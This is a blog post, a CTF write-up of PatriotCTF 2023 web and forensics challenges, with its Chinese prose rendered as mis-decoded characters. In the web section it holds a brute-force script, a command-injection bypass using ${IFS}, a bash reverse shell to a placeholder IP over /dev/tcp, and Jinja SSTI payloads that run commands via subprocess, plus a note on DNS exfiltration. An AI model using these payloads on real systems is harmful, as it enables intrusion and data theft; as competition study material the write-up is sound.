<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PatriotCTF 2023 write up"><meta name="keywords" content="pwn,web,misc,write up"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>PatriotCTF 2023 write up | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="åˆ‡æ¢æ–‡ç« è¯¦æƒ…">åˆ‡æ¢ç«™ç‚¹æ¦‚è§ˆ</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scavenger-Hunt%EF%BC%88%E7%83%82%E6%B4%BB%EF%BC%8C%E4%BD%86%E6%98%AF%E6%98%AFbeginner%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">Scavenger Huntï¼ˆçƒ‚æ´»ï¼Œä½†æ˜¯æ˜¯beginnerï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checkmate%EF%BC%88%E7%83%82%E6%B4%BB%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">Checkmateï¼ˆçƒ‚æ´»ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flower-Shop%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">Flower Shopï¼ˆå¥½æ´»ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pick-Your-Starter%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">Pick Your Starterï¼ˆå¥½æ´»ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#One-for-all%EF%BC%88%E7%A9%B6%E6%9E%81%E7%83%82%E6%B4%BB%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">One-for-allï¼ˆç©¶æçƒ‚æ´»ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">2.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsupported-Format"><span class="toc-number">2.1.</span> <span class="toc-text">Unsupported Format</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Read-The-EULA%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">Read The EULAï¼ˆå¥½æ´»ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Congratulations"><span class="toc-number">2.3.</span> <span class="toc-text">Congratulations</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT"><span class="toc-number">3.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rouge-Access-Point"><span class="toc-number">3.1.</span> <span class="toc-text">Rouge Access Point</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Satellite-Killer%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">Satellite Killerï¼ˆå¥½æ´»ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#guessinggame"><span class="toc-number">4.1.</span> <span class="toc-text">guessinggame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#printshop"><span class="toc-number">4.2.</span> <span class="toc-text">printshop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Coffee-Shop"><span class="toc-number">5.1.</span> <span class="toc-text">Coffee Shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patchwork"><span class="toc-number">5.2.</span> <span class="toc-text">Patchwork</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#garbage"><span class="toc-number">5.3.</span> <span class="toc-text">garbage</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">æ–‡ç« </span><span class="pull-right">49</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">æ ‡ç­¾</span><span class="pull-right">45</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">åˆ†ç±»</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">é­”æ³•å°‘å¥³é›ªæ®‡</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">æ–‡ç« </a><a class="site-page" href="/tags">æ ‡ç­¾</a><a class="site-page" href="/categories">åˆ†ç±»</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">PatriotCTF 2023 write up</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-09-11</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>å‘¨å…­æœ«æ¯”è¾ƒæ— èŠï¼Œè·Ÿèˆå‹å’Œå®éªŒå®¤çš„åŒå­¦æ‰¾äº†ä¸ªè€å¤–çš„æ¯”èµ›æ‰“æ‰“ï¼ŒæŠŠè‡ªå·±åšå‡ºæ¥çš„é¢˜å†™ä¸ªwpç„¶åéª‚éª‚å‡ºé¢˜äººã€‚</p>
<p><strong>æ€»ç»“ï¼špwnæ˜¯å¥½æ´»ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸ä¼šï¼›å–è¯æ˜¯å¥½æ´»ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¹Ÿä¸ä¼šï¼›é€†å‘æ˜¯å¥½æ´»ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸ä¼šï¼›å¼€æºæƒ…æŠ¥æ˜¯å¥½æ´»ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸ä¼šï¼›webæ˜¯çƒ‚æ´»ï¼Œä½†æ˜¯ğŸ‘´ğŸ»akäº†ï¼Œæˆ‘åªèƒ½è¯´æˆ‘æ˜¯ä¸ªå‚»é€¼ã€‚</strong></p>
<p>ï¼ˆæ³¨ï¼šæ¯é“é¢˜ç›®éƒ½ä¼šæ ‡æ³¨æ˜¯å¥½æ´»è¿˜æ˜¯çƒ‚æ´»ï¼Œå¥½æ´»ä¸çƒ‚æ´»çš„å”¯ä¸€è¯„åˆ¤æ ‡å‡†å°±æ˜¯èƒ½å¦å¯¹æœªæ¥æ¯”èµ›æœ‰ç”¨&amp;æ‰©å……çŸ¥è¯†&amp;å·©å›ºçŸ¥è¯†ï¼Œæ‰€æœ‰çš„è„‘æ´é¢˜æ ¹æ®å‡ºé¢˜äººçš„è™šæ— ç©ºé—´é‡Œçš„å¦å¤–ä¸€ä¸ªå¹³è¡Œæ—¶ç©ºçš„ğŸ´çš„å¯¿å‘½é•¿çŸ­æ¥åˆ¤æ–­çƒ‚æ´»ç¨‹åº¦</p>
<p><img src="https://s2.loli.net/2023/09/11/WpUJxEv3b6AfyhH.png" alt=""></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Scavenger-Huntï¼ˆçƒ‚æ´»ï¼Œä½†æ˜¯æ˜¯beginnerï¼‰"><a href="#Scavenger-Huntï¼ˆçƒ‚æ´»ï¼Œä½†æ˜¯æ˜¯beginnerï¼‰" class="headerlink" title="Scavenger Huntï¼ˆçƒ‚æ´»ï¼Œä½†æ˜¯æ˜¯beginnerï¼‰"></a>Scavenger Huntï¼ˆçƒ‚æ´»ï¼Œä½†æ˜¯æ˜¯beginnerï¼‰</h2><p>æ‰¾äº”éƒ¨åˆ†flagï¼Œf12æ‰¾åˆ°ä¸€å †ï¼Œè¿˜æœ‰ä¸€ä¸ªåœ¨robots.txtä¸‹é¢</p>
<h2 id="Checkmateï¼ˆçƒ‚æ´»ï¼‰"><a href="#Checkmateï¼ˆçƒ‚æ´»ï¼‰" class="headerlink" title="Checkmateï¼ˆçƒ‚æ´»ï¼‰"></a>Checkmateï¼ˆçƒ‚æ´»ï¼‰</h2><p><img src="https://s2.loli.net/2023/09/11/ufe2czMnmQRVF1d.png" alt=""></p>
<p>f12æ‰¾åˆ°æºç ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åè¿›è¡Œæ ¡éªŒï¼Œç„¶åä¸‹é¢æç¤ºcheck.php</p>
<p>é€†å‘æ²¡å•¥éš¾åº¦ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add_list = []</span><br><span class="line">or_list = []</span><br><span class="line">xor_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">        add_ = i &amp; j</span><br><span class="line">        or_ = i | j</span><br><span class="line">        xor_ = i ^ j</span><br><span class="line">        <span class="keyword">if</span> add_ == <span class="number">0x60</span>:</span><br><span class="line">            <span class="comment"># result[0] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[2] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;add:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            add_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line">        <span class="keyword">if</span> or_ == <span class="number">0x61</span>:</span><br><span class="line">            <span class="comment"># result[1] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[4] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;or:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            or_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line">        <span class="keyword">if</span> xor_ == <span class="number">0x6</span>:</span><br><span class="line">            <span class="comment"># result[3] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[5] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;xor:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            xor_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(add_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(or_list)):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_list)):</span><br><span class="line">            result.append(add_list[i][<span class="number">0</span>] + or_list[j][<span class="number">0</span>] + add_list[i][<span class="number">1</span>] + xor_list[k][<span class="number">0</span>] + or_list[j][<span class="number">1</span>] + xor_list[k][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(result))</span><br><span class="line">result = [line+<span class="string">&quot;\n&quot;</span> <span class="keyword">for</span> line <span class="keyword">in</span> result]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(result)</span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜ä¸»è¦æ˜¯ä¸çŸ¥é“è¦å¹²å•¥ï¼Œcheck.phpå°±æ˜¯è¾“å…¥å¯†ç ï¼Œç„¶åæ²¡äº†ï¼Œåæ¥çœ‹å‡ºé¢˜äººè¯´ï¼Œå’Œåå­—æœ‰å…³</p>
<p><img src="https://s2.loli.net/2023/09/11/5MekqF2SITpUKvO.png" alt=""></p>
<p>4kæ¬¡çˆ†ç ´ï¼Œä¸Šé¢è„šæœ¬è·‘å‡ºæ¥çš„ç»“æœå·®ä¸å¤šå°±æ˜¯ä¸‰åƒå¤šæ¬¡ï¼Œç›´æ¥çˆ†ç ´å°±å‡ºäº†ï¼Œçº¯çº¯çƒ‚æ´»</p>
<p><img src="https://s2.loli.net/2023/09/11/eNRpkKrXTHiZLoP.png" alt=""></p>
<h2 id="Flower-Shopï¼ˆå¥½æ´»ï¼‰"><a href="#Flower-Shopï¼ˆå¥½æ´»ï¼‰" class="headerlink" title="Flower Shopï¼ˆå¥½æ´»ï¼‰"></a>Flower Shopï¼ˆå¥½æ´»ï¼‰</h2><p>ç»™äº†æºç ï¼Œå®¡è®¡å‘ç°é‡ç½®å¯†ç åŠŸèƒ½æœ‰é—®é¢˜ï¼Œé‡ç½®å¯†ç åŠŸèƒ½ï¼Œæäº¤åˆ°reset.inc.phpä¸­å¤„ç†</p>
<p><img src="https://s2.loli.net/2023/09/11/Ka74UQRtIhejgk9.png" alt=""></p>
<p>reset.inc.phpä¸­è°ƒç”¨äº†resetPasswordæ–¹æ³•</p>
<p><img src="https://s2.loli.net/2023/09/11/TeJUQ2BdFpanuot.png" alt=""></p>
<p>è¿™é‡Œé¢æœ‰ä¸ªexecï¼Œå›æº¯ä¸‹å¯ä»¥å‘ç°tmpPassä¸å¯æ§ï¼Œä½†æ˜¯whæ˜¯å¯æ§å‚æ•°</p>
<p><img src="https://s2.loli.net/2023/09/11/tYsnRCbM8l3diaT.png" alt=""></p>
<p>whåœ¨æ³¨å†Œçš„æ—¶å€™ä¼šè®©ä½ ä¼ å…¥ä¸€ä¸ªwebhooké“¾æ¥ï¼Œå‚æ•°å¯æ§</p>
<p><img src="https://s2.loli.net/2023/09/11/unNyeg68JKHMpPx.png" alt=""></p>
<p>ä½†æ˜¯ä¼šè¿›è¡Œä¸€äº›è¿‡æ»¤ï¼Œä¸»è¦æ˜¯è¿›è¡Œäº†filter_varçš„è¿‡æ»¤ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/11/3cxeTPmMqN5VIzh.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/nBzSdHKlsNOhmEZ.png" alt=""></p>
<p>å‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªfilter_varæ²¡å¿…è¦ç»•è¿‡ï¼Œå¯ä»¥ç›´æ¥æ¤å…¥webhooké“¾æ¥ï¼Œä¹Ÿå¯ä»¥ç”¨javascriptä¼ªåè®®æ¥ç»•ï¼›ç¬¬ä¸€ä¸ªè¿‡æ»¤ç©ºæ ¼ï¼Œå¯ä»¥ç”¨${IFS}æ¥ç»•</p>
<p>ä½†æ˜¯å‘½ä»¤æ²¡å›æ˜¾ï¼Œè€ƒè™‘åå¼¹shellï¼Œåœ¨vpsä¸Šå»ºä¸€ä¸ªtest.txtï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­æ¢ä¸Šè‡ªå·±çš„å…¬ç½‘ipï¼Œç„¶åç›‘å¬7777ç«¯å£</p>
<p>payloadå¦‚ä¸‹ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/11/LZx1ktoYuQTh94R.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/nCxH2eThRWcXFz7.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/No9CUphBfHnTzEu.png" alt=""></p>
<h2 id="Pick-Your-Starterï¼ˆå¥½æ´»ï¼‰"><a href="#Pick-Your-Starterï¼ˆå¥½æ´»ï¼‰" class="headerlink" title="Pick Your Starterï¼ˆå¥½æ´»ï¼‰"></a>Pick Your Starterï¼ˆå¥½æ´»ï¼‰</h2><p>ç»™äº†å¦‚ä¸‹é¡µé¢</p>
<p><img src="https://s2.loli.net/2023/09/11/9IqKZfFpsA6oVl7.png" alt=""></p>
<p>æµ‹æµ‹å¯ä»¥å‘ç°æ˜¯ssti</p>
<p><img src="https://s2.loli.net/2023/09/11/DEPakRhsZoO4NWc.png" alt=""></p>
<p>é¦–å…ˆè€ƒè™‘å¸¦osçš„å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯æ‰‹åŠ¨fuzzäº†ä¸€æ³¢ï¼Œå‘ç°äº†å¤§è‡´æœ‰å¦‚ä¸‹é»‘åå•ï¼š</p>
<blockquote>
<p>os</p>
<p>-</p>
<p>ç©ºæ ¼</p>
<p>[]</p>
<p>â€˜</p>
<p>â€œ</p>
<p>builtins</p>
</blockquote>
<p>ç„¶åè€ƒè™‘ç”¨lazyFIleè¯»ä¸€ä¸‹æ–‡ä»¶ï¼Œä½†æœ€ç»ˆå¤±è´¥äº†ï¼Œç„¶åè€ƒè™‘ç”¨subprocess.Processæ‰§è¡Œå‘½ä»¤ï¼Œå…ˆè·‘ä¸€ä¸‹ä»–çš„ä½ç½®ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>, <span class="number">500</span>):</span><br><span class="line">    payload = <span class="string">&quot;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(&quot;</span>  + <span class="built_in">str</span>(i) +  <span class="string">&quot;)&#125;&#125;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://chal.pctf.competitivecyber.club:5555/&#x27;</span> + payload</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;Flag 5/5=e4a541; PHPSESSID=1314a5d83fd38e1c6d3ebdf4a2873a68&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;subprocess&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>æœ¬æ¥æƒ³ç”¨å¦‚ä¸‹payloadæ‰“</p>
<p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(455)(request.args.cmd,shell=True,stdout=-1).communicate().__getitem__(0).strip()&#125;&#125;&amp;cmd=ls</code></p>
<p>ç»“æœå‘ç°è¿‡æ»¤äº†è´Ÿå·ï¼Œæƒ³ç”¨~Falseæ¥ç»•ï¼Œç»“æœ500äº†ï¼Œä½†æ˜¯æœ¬åœ°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸æ¸…æ¥šè¿œç¨‹ä»€ä¹ˆæƒ…å†µï¼Œurlç¼–ç ä¹Ÿä¸å½³äºï¼Œè€Œä¸”ç»è¿‡æµ‹è¯•ï¼Œæ²¡æ³•ç”¨request.argså’Œrequest.valuesæ¥ä¼ å‚ï¼Œå‘½ä»¤æ— æ³•æ‰§è¡Œï¼Œä¹Ÿä¸æ¸…æ¥šä»€ä¹ˆæƒ…å†µï¼ˆ</p>
<p><img src="https://s2.loli.net/2023/09/11/ny843IzLX2mVSMO.png" alt=""></p>
<p>æ‰€ä»¥è€ƒè™‘ä¸ç”¨stdoutå›æ˜¾å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œé‚£ä¹ˆé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯åå¼¹shellï¼Œä½†æ˜¯å‚æ•°çš„ä½ç½®æ—¢ä¸èƒ½getï¼Œåˆä¸èƒ½postæ¥ä¼ ï¼Œæ‰€ä»¥æƒ³åˆ°ç”¨cookieä¼ ã€‚</p>
<p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(455)(request.cookies.a,shell=True).communicate()&#125;&#125;</code></p>
<p>å½“cookieä¼ å…¥sleep 5æ—¶ï¼Œé¡µé¢åœæ­¢å“åº”ï¼Œè¯æ˜å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œserverç«¯æ²¡æœ‰curlï¼Œncä¹‹ç±»çš„ï¼Œbash -i åå¼¹shellä¹Ÿä¸ç®¡ç”¨ã€‚</p>
<p>é‚£å°±è€ƒè™‘DNSå¤–å¸¦ï¼Œå‘ç°æ²¡æœ‰ç¦pingå‘½ä»¤</p>
<p><img src="https://s2.loli.net/2023/09/11/7kDAqGPVEKCHwZi.png" alt=""></p>
<p>ä½†æ˜¯DNSå¤–å¸¦çš„è¯ï¼Œå‘½ä»¤æ‰§è¡Œçš„ç»“æœå¾ˆé•¿å°±å¤–å¸¦ä¸äº†ï¼Œæ‰€ä»¥åªèƒ½çŒœæµ‹flagçš„ä½ç½®ï¼Œç„¶åå°±çŒœä¸­äº†ï¼ŒpayloadæŠ¥æ–‡å¦‚ä¸‹</p>
<p><img src="https://s2.loli.net/2023/09/11/DckWl7rpznstSNh.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/VzjwP613vMF4ob9.png" alt=""></p>
<h2 id="One-for-allï¼ˆç©¶æçƒ‚æ´»ï¼‰"><a href="#One-for-allï¼ˆç©¶æçƒ‚æ´»ï¼‰" class="headerlink" title="One-for-allï¼ˆç©¶æçƒ‚æ´»ï¼‰"></a>One-for-allï¼ˆç©¶æçƒ‚æ´»ï¼‰</h2><p>è¿™ä¹ˆå–œæ¬¢ç©æ‹¼å›¾è¦ä¸è¦æŠŠä½ ğŸ´ç»™æ‹¼èµ·æ¥</p>
<p>å››éƒ¨åˆ†flagï¼Œå®Œå…¨æ²¡æœ‰ä»»ä½•é€»è¾‘ï¼Œé™¤äº†æœ‰ä¸€éƒ¨åˆ†æ˜¯sqlæ³¨å…¥ï¼Œå…¨é æ‘çŒœï¼Œå‡ºé¢˜äººè¿˜ä¸è®©çˆ†ç ´ï¼Œä¸çˆ†ç ´æ‹¿ğŸ”¨çŒœ</p>
<p>å‡ºé¢˜äººç”¨flaskå†™çš„ï¼ŒæŒ‰ç…§æ‰¾åˆ°flagçš„é¡ºåºæ¥è¯´ï¼Œé¦–å…ˆæ˜¯æœ€åä¸€éƒ¨åˆ†flagï¼Œæœ‰ä¸ªprofileé¡µé¢ï¼Œidä¼ 0æ‰ç»™æœ€åä¸€éƒ¨åˆ†flagï¼Œåˆ«çš„ä¼ å•¥éƒ½æ˜¯ä¸€ä¸ªé™æ€é¡µé¢</p>
<p><img src="https://s2.loli.net/2023/09/11/o2WILqvrbHxk3nE.png" alt=""></p>
<p>ç„¶åç¬¬ä¸€éƒ¨åˆ†flagæ˜¯åœ¨ä¸»é¡µé‡Œé¢æŠŠcookieæ”¹æˆadminè·å–flag</p>
<p>ç¬¬ä¸‰éƒ¨åˆ†flagæ˜¯sqlæ³¨å…¥ï¼ŒåŒæ—¶è·å¾—ä¸€ä¸ªsecreté¡µé¢ï¼š</p>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20230910143859539.png" alt=""></p>
<p>ç¬¬äºŒéƒ¨åˆ†flagå°±åœ¨ä»–ç»™çš„secretè·¯å¾„ç›¸å…³ï¼Œä½†æ˜¯æƒ³äº†ä¸€ä¸‹åˆï¼Œå•¥æ‰‹æ³•éƒ½è¯•äº†éƒ½æ²¡æœ‰ç»“æœï¼Œç„¶ådirsearchä¸Šå¤§åˆ†ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/11/6oSDtL4sHmyZqiX.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/y7fWeho8SUpYQrH.png"  /></p>
<p>æˆ‘åªèƒ½è¯´ç©¶æçƒ‚æ´»ï¼Œç„¶åæ¯”èµ›ç»“æŸåå¼€æºäº†ä»“åº“ï¼Œæˆ‘å¯»æ€å»çœ‹çœ‹å’‹å†™çš„ä»£ç å§ï¼Œç»“æœï¼š</p>
<p><img src="https://s2.loli.net/2023/09/11/hTmrtiwZV1SAJGY.png" alt=""></p>
<p>ä½ ğŸ´â‘£äº†</p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Unsupported-Format"><a href="#Unsupported-Format" class="headerlink" title="Unsupported Format"></a>Unsupported Format</h2><p>ä¿®jpgï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™ä¸€æŠŠğŸ”äº†ï¼Œå±äºbeginner</p>
<p><img src="https://s2.loli.net/2023/09/11/1E2ygbGxz69ritY.jpg" alt=""></p>
<h2 id="Read-The-EULAï¼ˆå¥½æ´»ï¼‰"><a href="#Read-The-EULAï¼ˆå¥½æ´»ï¼‰" class="headerlink" title="Read The EULAï¼ˆå¥½æ´»ï¼‰"></a>Read The EULAï¼ˆå¥½æ´»ï¼‰</h2><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p> My friend and I use to play Minecraft all the time together, but with recent updates he went off on some tangent about something called a Eula or something like that. Anyways, he said he found a new mining game he was testing but wouldnâ€™t tell me the name of it. All he sent was a PCAP of him playing the game, saying he hid a flag in his movementâ€¦ whatever that means.</p>
</blockquote>
<p>ç„¶åç»™äº†ä¸ªæµé‡åŒ…ï¼Œä¸€å¼€å§‹wiresharkè§£æå‡ºæ¥å…¨éƒ¨æ˜¯UDPçš„æµé‡ï¼Œä½†æ˜¯çœ‹èµ·æ¥ä¼¼ä¹æ˜¯ä¸€æ®µç”¨æˆ·è‡ªå®šä¹‰çš„åè®®</p>
